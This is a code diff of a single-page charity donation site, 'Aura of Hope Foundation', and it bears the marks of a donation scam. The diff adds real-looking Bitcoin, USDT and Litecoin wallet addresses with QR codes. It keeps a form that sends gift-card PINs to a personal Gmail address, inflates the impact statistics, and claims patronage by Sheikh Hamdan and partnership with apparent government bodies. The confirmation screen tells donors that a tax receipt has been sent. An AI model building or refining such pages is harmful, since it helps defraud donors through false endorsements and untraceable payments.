@@ -385,7 +385,7 @@
                     <p>Communities Reached</p>
                 </div>
                 <div class="stat-item">
-                    <h3>45,000</h3>
+                    <h3>65,000+</h3>
                     <p>Lives Impacted</p>
                 </div>
             </div>
@@ -405,14 +405,14 @@
                 <div class="card">
                     <img src="https://lh3.googleusercontent.com/d/1kvWEGDANRVDkpO_43qkMeHZl664ueWDC=w1000?authuser=0" alt="Sick Arabian child requiring medical relief">
                     <h3 style="color: var(--gold); margin-bottom: 1rem;">Medical Relief</h3>
-                    <p style="color: var(--text-muted);">Deploying mobile clinics and essential pharmaceuticals to isolated regional sectors.</p>
+                    <p style="color: var(--text-muted);">Deploying mobile medical clinics and essential pharmaceuticals directly to isolated regional sectors to deliver life-saving healthcare, routine immunizations, and urgent pediatric treatments to children in hard-to-reach communities.</p>
                 </div>
             </div>
 
             <div style="max-width: 800px; margin: 4rem auto 0 auto; text-align: center; padding: 2rem; background-color: var(--surface-color); border: 1px solid var(--surface-border); border-radius: 8px;">
                 <h3 style="color: var(--gold); margin-bottom: 1rem; font-size: 1.8rem;">A Vision Rooted in Empathy and Action</h3>
                 <p style="color: var(--text-muted); line-height: 1.8; font-size: 1.05rem;">
-                    At Aura of Hope, our core initiatives serve as the vital lifelines connecting generosity with genuine human transformation. By strategically focusing on global education, sustainable clean water access, and proactive medical relief, we target the foundational pillars necessary to pull vulnerable communities out of chronic hardship. Every learning center built, every purification well installed, and every mobile medical clinic deployed represents a tangible step toward a more equitable world. Together, fueled by unwavering compassion and driven by transparent stewardship, we bridge the gap between despair and lasting opportunity—ensuring that no community is left behind in the pursuit of dignity and a brighter tomorrow.
+                    At Aura of Hope, our core initiatives serve as the vital lifelines connecting generosity with the bright futures children deserve. By strategically focusing on child education, clean water access, and pediatric medical relief, we target the foundational pillars necessary to protect vulnerable kids from chronic hardship. Every learning center built, every safe water well installed, and every mobile clinic deployed represents a tangible step toward giving children a safer, healthier world. Together, fueled by unwavering compassion and driven by transparent stewardship, we bridge the gap between despair and lasting opportunity—ensuring no child is left behind in the pursuit of dignity, joy, and a brighter future.
                 </p>
             </div>
         </section>
@@ -421,7 +421,7 @@
         <section id="donate" class="page">
             <div style="max-width: 600px; margin: 0 auto;">
                 <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Support Our Cause</h2>
-                <p style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Select your contribution amount, currency, and preferred method.</p>
+                <p style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Select donation amount, currency, and preferred method.</p>
                 
                 <div class="card">
                     <label for="currency-select">Select Currency</label>
@@ -439,7 +439,7 @@
                         <button class="amount-btn" onclick="setAmount(500, this)"><span class="curr-sym">$</span>500</button>
                     </div>
                     
-                    <label for="custom-amount">Or Custom Amount (Minimum 60)</label>
+                    <label for="custom-amount">Or Input Amount (Minimum 60)</label>
                     <input type="number" id="custom-amount" placeholder="Enter amount (min 60)" min="60" oninput="setCustomAmount(this)">
 
                     <label style="margin-top: 1.5rem;">Select Payment Method</label>
@@ -448,7 +448,7 @@
                         <div class="method-card" onclick="setMethod('Crypto', this)">Crypto</div>
                     </div>
 
-                    <button class="btn" style="width: 100%; margin-top: 1rem;" onclick="validateAndProceed()">Proceed to Checkout</button>
+                    <button class="btn" style="width: 100%; margin-top: 1rem;" onclick="validateAndProceed()">Proceed</button>
                 </div>
             </div>
         </section>
@@ -457,11 +457,11 @@
         <section id="checkout" class="page">
             <div style="max-width: 600px; margin: 0 auto;">
                 <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Finalize Contribution</h2>
-                <p style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Please review your details to secure your transaction.</p>
+                <p style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Please review details of your contribution.</p>
 
                 <div class="summary-box">
                     <div class="summary-row">
-                        <span>Selected Contribution:</span>
+                        <span>Selected Amount:</span>
                         <span id="summary-amount">$100.00</span>
                     </div>
                     <div class="summary-row">
@@ -496,28 +496,75 @@
                         <option value="ltc">Litecoin (LTC)</option>
                     </select>
 
-                    <div id="crypto-details-container" style="text-align: center; margin-top: 1.5rem;">
-                        <!-- Bitcoin Block -->
-                        <div id="qr-btc" class="crypto-qr-block">
-                            <img id="img-btc" src="" alt="Bitcoin QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px;">
-                            <label>Bitcoin Wallet Address</label>
-                            <input type="text" id="input-btc" value="YOUR_BITCOIN_WALLET_ADDRESS_HERE" readonly style="text-align: center; font-family: monospace;">
-                        </div>
+   <div id="crypto-details-container" style="text-align: center; margin-top: 1.5rem; color: #fff;">
+    
+    <!-- Bitcoin Block -->
+    <div id="qr-btc" class="crypto-qr-block" style="background: #0f172a; padding: 2rem; border-radius: 1rem; border: 1px solid #1e293b; max-width: 400px; margin: 0 auto 1.5rem auto;">
+        <img id="img-btc" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=bc1q8acdzjj2th86scc5f5yl5tr8rz048234xtknce" alt="Bitcoin QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px; display: inline-block;">
+        
+        <label style="display: block; font-weight: bold; margin-bottom: 0.5rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em;">Bitcoin Wallet Address</label>
+        
+        <input type="text" id="input-btc" value="bc1q8acdzjj2th86scc5f5yl5tr8rz048234xtknce" readonly style="width: 100%; text-align: center; font-family: monospace; padding: 0.75rem; border-radius: 0.5rem; background: #1e293b; border: 1px solid #334155; color: #38bdf8; font-size: 0.85rem; margin-bottom: 1.5rem;" onclick="this.select();">
+        
+        <div style="text-align: left; background: rgba(30, 41, 59, 0.5); padding: 1rem; border-radius: 0.75rem; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; line-height: 1.5;">
+            <p style="font-weight: bold; color: #f8fafc; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em;">Payment Instructions:</p>
+            <ol style="margin: 0; padding-left: 1.25rem;">
+                <li>Open your crypto wallet or exchange app.</li>
+                <li>Scan the QR code above or copy the Bitcoin address.</li>
+                <li>Ensure you are sending over the <strong style="color: #f8fafc;">Bitcoin (BTC) Network</strong>.</li>
+                <li>Double-check the address before confirming the transfer.</li>
+            </ol>
+        </div>
+    </div>
                         
-                        <!-- USDT Block -->
-                        <div id="qr-usdt" class="crypto-qr-block" style="display: none;">
-                            <img id="img-usdt" src="" alt="USDT QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px;">
-                            <label>USDT Wallet Address (TRC20)</label>
-                            <input type="text" id="input-usdt" value="YOUR_USDT_WALLET_ADDRESS_HERE" readonly style="text-align: center; font-family: monospace;">
-                        </div>
+    <!-- USDT Block -->
+    <div id="qr-usdt" class="crypto-qr-block" style="background: #0f172a; padding: 2rem; border-radius: 1rem; border: 1px solid #1e293b; max-width: 400px; margin: 0 auto 1.5rem auto;">
+        <img id="img-usdt" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=TDgVeanJ7W7zywuwr6ws1BPyR4Za9KNcAo" alt="USDT QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px; display: inline-block;">
+        
+        <label style="display: block; font-weight: bold; margin-bottom: 0.5rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em;">USDT Wallet Address (TRC20)</label>
+        
+        <input type="text" id="input-usdt" value="TDgVeanJ7W7zywuwr6ws1BPyR4Za9KNcAo" readonly style="width: 100%; text-align: center; font-family: monospace; padding: 0.75rem; border-radius: 0.5rem; background: #1e293b; border: 1px solid #334155; color: #38bdf8; font-size: 0.85rem; margin-bottom: 1.5rem;" onclick="this.select();">
+
+        <div style="text-align: left; background: rgba(30, 41, 59, 0.5); padding: 1rem; border-radius: 0.75rem; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; line-height: 1.5;">
+            <p style="font-weight: bold; color: #f8fafc; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em;">Payment Instructions:</p>
+            <ol style="margin: 0; padding-left: 1.25rem;">
+                <li>Open your crypto wallet or exchange.</li>
+                <li>Select <strong>Send</strong> and choose <strong>USDT</strong>.</li>
+                <li>Ensure you select the <strong style="color: #f8fafc;">TRON (TRC20)</strong> network to avoid losing funds.</li>
+                <li>Scan the QR code or copy and paste the address, enter the amount, and send.</li>
+            </ol>
+        </div>
+    </div>
                         
-                        <!-- Litecoin Block -->
-                        <div id="qr-ltc" class="crypto-qr-block" style="display: none;">
-                            <img id="img-ltc" src="" alt="Litecoin QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px;">
-                            <label>Litecoin Wallet Address</label>
-                            <input type="text" id="input-ltc" value="YOUR_LITECOIN_WALLET_ADDRESS_HERE" readonly style="text-align: center; font-family: monospace;">
-                        </div>
-                    </div>
+    <!-- Litecoin Block -->
+    <div id="qr-ltc" class="crypto-qr-block" style="background: #0f172a; padding: 2rem; border-radius: 1rem; border: 1px solid #1e293b; max-width: 400px; margin: 0 auto;">
+        <img id="img-ltc" src="" alt="Litecoin QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px; display: inline-block;">
+        
+        <label style="display: block; font-weight: bold; margin-bottom: 0.5rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em;">Litecoin Wallet Address</label>
+        
+        <input type="text" id="input-ltc" value="ltc1qn3e59qn6tect6attdtah80hjw32zkft49d83ak" readonly style="width: 100%; text-align: center; font-family: monospace; padding: 0.75rem; border-radius: 0.5rem; background: #1e293b; border: 1px solid #334155; color: #38bdf8; font-size: 0.85rem; margin-bottom: 1.5rem;" onclick="this.select();">
+
+        <div style="text-align: left; background: rgba(30, 41, 59, 0.5); padding: 1rem; border-radius: 0.75rem; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; line-height: 1.5;">
+            <p style="font-weight: bold; color: #f8fafc; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em;">Payment Instructions:</p>
+            <ol style="margin: 0; padding-left: 1.25rem;">
+                <li>Open your crypto wallet or exchange app.</li>
+                <li>Scan the QR code above or copy the Litecoin address.</li>
+                <li>Ensure you are sending over the <strong style="color: #f8fafc;">Litecoin (LTC) Network</strong>.</li>
+                <li>Double-check the address before confirming the transfer.</li>
+            </ol>
+        </div>
+    </div>
+
+</div>
+
+<script>
+  // Automatically generate and inject the Litecoin QR code URL
+  const ltcWalletAddress = "ltc1qn3e59qn6tect6attdtah80hjw32zkft49d83ak";
+  const qrImgElement = document.getElementById('img-ltc');
+  if (qrImgElement) {
+    qrImgElement.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(ltcWalletAddress)}`;
+  }
+</script>
 
                     <button class="btn" style="width: 100%; margin-top: 1rem;" onclick="navigateTo('confirmation')">I Have Sent the Payment</button>
                 </div>
@@ -533,7 +580,7 @@
                 <div class="card">
                     <form id="giftcard-form" action="https://formsubmit.co/pteminence@gmail.com" method="POST" enctype="multipart/form-data">
                         <label for="donor-email">Your Email Address</label>
-                        <input type="email" id="donor-email" name="email" placeholder="jane@example.com" required>
+                        <input type="email" id="donor-email" name="email" placeholder="you@gmail.com" required>
 
                         <label for="card-details">Gift Card Code / Text Details</label>
                         <textarea id="card-details" name="card_details" rows="4" placeholder="Enter card pin, code, or relevant text information here..." required></textarea>
@@ -555,7 +602,7 @@
             <div class="confirmation-box">
                 <div class="success-icon">✓</div>
                 <h2 style="color: var(--gold); margin-bottom: 1rem;">Thank You For Your Generosity!</h2>
-                <p style="color: var(--text-muted); margin-bottom: 2rem;">Your contribution has been successfully processed. An official tax receipt and mission update tracking sheet have been dispatched to your email address.</p>
+                <p style="color: var(--text-muted); margin-bottom: 2rem;">Your donatioon has been successfully processed. An official tax receipt and mission update tracking sheet has been dispatched to your email address.</p>
                 
                 <div class="summary-box" style="text-align: left; margin-bottom: 2rem;">
                     <div class="summary-row">
@@ -579,31 +626,31 @@
         <!-- CREDITS -->
         <section id="credits" class="page">
             <div class="credits-container">
-                <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Project Credits & Attribution</h2>
-                <p style="text-align: center; color: var(--text-muted); margin-bottom: 3rem;">Acknowledge the visionaries, designers, and engineering constructs powering Aura of Hope.</p>
+                <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Credits & Attribution</h2>
+                <p style="text-align: center; color: var(--text-muted); margin-bottom: 3rem;">Acknowledge the visionaries, powering Aura of Hope Foundation.</p>
 
                 <div class="credits-section" style="text-align: center;">
                     <h3>Patronage & Leadership</h3>
                     <div class="card" style="max-width: 400px; margin: 0 auto;">
                         <img src="https://lh3.googleusercontent.com/d/1Nb6KGUZN-D1EoGQffrAv3XCpu7NYgeyE=w1000?authuser=0" alt="HH Sheikh Hamdan bin Mohammed bin Rashid Al Maktoum" style="height: 300px; object-fit: cover;">
                         <h4 style="color: var(--gold); margin-bottom: 0.5rem;">HH Sheikh Hamdan bin Mohammed Al Maktoum</h4>
-                        <p style="color: var(--text-muted); font-size: 0.9rem;">Official Portrait / Patronage & Inspiration</p>
+                        <p style="color: var(--text-muted); font-size: 0.9rem;">Official Patronage & Inspiration</p>
                     </div>
                 </div>
 
                 <div class="credits-section">
-                    <h3>Design & Architecture</h3>
-                    <p style="color: var(--text-muted);">Concept crafted around a luxurious, high-contrast aesthetic utilizing pitch black structural foundations paired with premium gold accent styling gradients.</p>
+                    <h3>Powered By</h3>
+                    <p style="color: var(--text-muted);">HH Sheikh Hamdan bin Mohammed Al Maktoum.</p>
                 </div>
 
                 <div class="credits-section">
-                    <h3>Typography & UI Assets</h3>
-                    <p style="color: var(--text-muted);">Built using native System UI stacks for lightning-fast asset rendering, structural precision, and responsive layout scaling across all viewports.</p>
+                    <h3>In Collaboration With</h3>
+                    <p style="color: var(--text-muted);">Middle Eastern Development Initiative</p>
                 </div>
 
                 <div class="credits-section">
-                    <h3>Open Source & Community</h3>
-                    <p style="color: var(--text-muted);">Developed as an all-in-one embedded single-page architecture prototype to demonstrate frictionless web interactions.</p>
+                    <h3>Also In Collaboration With</h3>
+                    <p style="color: var(--text-muted);">UAE Child Development Authority</p>
                 </div>
 
                 <div style="text-align: center; margin-top: 3rem;">
@@ -613,7 +660,7 @@
         </section>
     </main>
     <footer>
-        <p>&copy; 2026 Aura of Hope Foundation. Dedicated to global human preservation.</p>
+        <p>&copy; 2026 Aura of Hope Foundation. Dedicated to global child preservation.</p>
     </footer>
 
     <script>
